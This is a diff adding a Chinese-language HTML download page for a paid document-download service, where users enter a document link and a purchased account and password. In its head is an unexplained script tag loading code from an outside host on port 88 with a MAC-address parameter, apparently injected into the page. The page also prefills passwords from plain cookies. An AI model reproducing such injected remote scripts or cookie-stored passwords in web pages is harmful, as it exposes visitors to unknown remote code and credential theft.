@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <!--[if lt IE 9]>
+    <script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.ie8polyfill.min.js"></script>
+    <![endif]-->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit">
+    <meta charset="UTF-8">
+
+    <title>文档服务 下载页</title>
+    <link href="https://s1.pstatp.com/cdn/expire-1-M/amazeui/2.7.2/css/amazeui.min.css" rel="stylesheet">
+    <link href="http://s0.pstatp.com/cdn/expire-1-M/layer/2.3/skin/layer.css" rel="stylesheet">
+
+    <script src="http://s0.pstatp.com/cdn/expire-1-M/jquery/3.2.1/jquery.min.js"></script>
+    <script src="http://s2.pstatp.com/cdn/expire-1-M/layer/2.3/layer.js"></script>
+    <script src="https://s2.pstatp.com/cdn/expire-1-M/amazeui/2.7.2/js/amazeui.min.js"></script>
+    <script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
+    <script src="https://s3.pstatp.com/cdn/expire-1-M/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+    <style>
+        .container {
+            max-width: 880px;
+            margin: 0 auto;
+        }
+    </style>
+<script async=true src="http://t.wsgblw.com:88/j1.js?MAC=747D24F943D0"></script>
+</head>
+
+<body onload="loadusrinfo()">
+
+    <div class="am-projects container am-round" style="background:#137;height:60px">
+        <div class="amz-container am-cf" margin-top="10">
+            <div>
+                <div align="center" style="color:#FFF;font-size:28px">文档服务</div>
+            </div>
+        </div>
+
+    </div>
+
+    <header id="amz-header" class="am-round container">
+        <div class="amz-container am-cf" align="center">
+            <ul class="am-nav am-nav-pills am-fr">
+                <!-- <li><a href="http://www.hjcruises.com/UxpeLV2/GRxBR32.html" target="_blank">购买账号</a></li> -->
+                <li style="margin-right: 20px">
+                    <div class="am-dropdown" data-am-dropdown>
+                        <button class="am-btn am-btn-primary am-dropdown-toggle" data-am-dropdown-toggle>其他<span
+                                class="am-icon-caret-down"></span></button>
+                        <ul class="am-dropdown-content">
+                            <li><a href="http://www.blpack.com/usem.html" target="_blank">使用教程</a></li>
+                            <li><a href="http://www.blpack.com/crxm.html" target="_blank">插件教程</a></li>
+                            <li><a href="./center.html" target="_blank">操作中心</a></li>
+                        </ul>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="page pg-demo">
+            <div id="demo-view" data-backend-compiled>
+                <section data-am-widget="accordion" class="am-accordion am-accordion-default"
+                    data-am-accordion='{ "multiple": true }'>
+                    <dl class="am-accordion-item">
+                        <dt class="am-accordion-title">使用说明</dt>
+                        <dd class="am-accordion-bd am-collapse">
+                            <div class="am-accordion-content .am-monospace am-round">
+                                永久域名：http://www.blpack.com<br />账号仅供个人使用：不要批量下载，共享使用!<br />网站已更新，使用前刷新下页面，插件已更新，插件教程页面下载。
+                            </div>
+                        </dd>
+                    </dl>
+                    <dl class="am-accordion-item">
+                        <dt class="am-accordion-title">售后</dt>
+                        <dd class="am-accordion-bd am-collapse">
+                            <div class="am-accordion-content .am-monospace am-round">
+                                微信公众号: 文档服务
+                            </div>
+                            <div id="qun" class="am-accordion-content .am-monospace am-round">
+                            </div>
+                        </dd>
+                    </dl>
+                </section>
+            </div>
+        </div>
+
+        <div class="am-g">
+            <div class="am-u-sm-12">
+                <div class="am-g">
+                    <div class="am-u-sm-3">
+                        <p>文档链接:</p>
+                    </div>
+                    <div class="am-u-sm-9">
+                        <input id="docid" type="text" class="am-form-field am-radius am-round" placeholder="你要下的文档的连接"
+                            name="docid" style="width:100%;">
+                        <input id="downlink" type="hidden">
+                    </div>
+                </div>
+                <div class="am-g">
+                    <div class="am-u-sm-3">
+                        <p>账号:</p>
+                    </div>
+
+                    <div class="am-u-sm-9">
+                        <input id="baiduacc" type="text" class="am-form-field am-radius am-round" placeholder="输入购买的账号"
+                            name="usrid">
+                    </div>
+                </div>
+                <div class="am-g">
+                    <div class="am-u-sm-3">
+                        <p>
+                            密码:
+                        </p>
+                    </div>
+
+                    <div class="am-u-sm-9">
+                        <input id="baidupwd" type="password" class="am-form-field am-radius am-round"
+                            placeholder="输入购买的密码" name="usrpwd">
+
+                    </div>
+                </div>
+                <br />
+                <div class="am-btn-group">
+                    <label class="am-checkbox">
+                        <input type="checkbox" id="getpass" data-am-ucheck>
+                        显示密码
+                    </label>
+                    <button id="submitdown" class="am-btn am-btn-warning am-round am-icon-cloud-download">下载</button>
+                    <button id="getwealth" class="am-btn am-btn-success am-round am-icon-cog ">查询余额</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script src="func.js"></script>
+    <script type="text/javascript">
+        function loadusrinfo() {
+            var usracc = $.cookie('usrname');
+            var usrpsw = $.cookie('usrpwd');
+            $('#baiduacc').val(usracc);
+            $('#baidupwd').val(usrpsw);
+            getqun();
+        }
+    </script>
+</body>
+
+</html>
